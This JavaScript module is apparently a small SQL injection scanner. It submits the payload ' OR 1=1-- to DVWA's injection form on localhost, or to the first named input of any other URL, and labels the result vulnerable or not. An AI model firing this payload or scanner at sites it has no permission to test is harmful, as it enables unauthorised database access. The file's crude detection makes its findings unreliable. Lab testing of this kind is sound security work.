const puppeteer = require('puppeteer');
const axios = require('axios');

const sqlPayload = `' OR 1=1--`;

const checkSqlInjection = async (url) => {
    const results = [];
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();

    try {
        const isDVWA = url.includes('localhost:8080');

        if (isDVWA) {
            console.log('Detected DVWA. Navigating to the SQL Injection module...');
            await page.goto(`${url}/vulnerabilities/sqli/`, { waitUntil: 'networkidle2' });
            await page.waitForSelector('input[name="id"]', { timeout: 10000 });

            await page.type('input[name="id"]', sqlPayload);
            await page.click('input[type="submit"]');
            await page.waitForSelector('pre', { timeout: 10000 });

            const responseText = await page.$eval('pre', (el) => el.textContent.toLowerCase());

            if (responseText.includes('user id') && responseText.includes('first name')) {
                results.push({
                    inputName: 'id',
                    payload: sqlPayload,
                    status: 'Vulnerable',
                    reason: 'Successfully retrieved user data with SQL Injection',
                });
                console.log('SQL Injection detected on DVWA!');
            } else {
                results.push({
                    inputName: 'id',
                    payload: sqlPayload,
                    status: 'Not Vulnerable',
                    reason: 'No data retrieved with SQL Injection',
                });
                console.log('No SQL Injection detected on DVWA.');
            }
        } else {
            console.log('Testing a generic website for SQL Injection...');
            await page.goto(url, { waitUntil: 'networkidle2' });
            await page.waitForSelector('input, textarea', { timeout: 10000 });

            const elements = await page.$$eval('input, textarea', (elements) => {
                return elements.map((element) => {
                    const name = element.getAttribute('name');
                    return { name };
                }).filter((element) => element.name);
            });

            if (elements.length === 0) {
                console.log('No input fields found.');
                await browser.close();
                return results;
            }

            const element = elements[0];
            const requestUrl = `${url}?${element.name}=${encodeURIComponent(sqlPayload)}`;

            console.log(`Testing URL: ${requestUrl}`);
            try {
                const response = await axios.get(requestUrl);
                const responseText = response.data.toLowerCase();

                if (responseText.includes('sql syntax error') || responseText.includes('database error')) {
                    results.push({
                        inputName: element.name,
                        payload: sqlPayload,
                        status: 'Vulnerable',
                        reason: 'Detected SQL error message',
                    });
                    console.log('SQL Injection detected!');
                } else {
                    results.push({
                        inputName: element.name,
                        payload: sqlPayload,
                        status: 'Not Vulnerable',
                        reason: 'No SQL error message detected',
                    });
                }
            } catch (error) {
                results.push({
                    inputName: element.name,
                    payload: sqlPayload,
                    status: 'Potentially Vulnerable',
                    reason: `Request failed with error: ${error.message}`,
                });
            }
        }

        await browser.close();
        return results;
    } catch (err) {
        console.error(`Error during scanning: ${err.message}`);
        await browser.close();
        return [];
    }
};

module.exports = { checkSqlInjection };
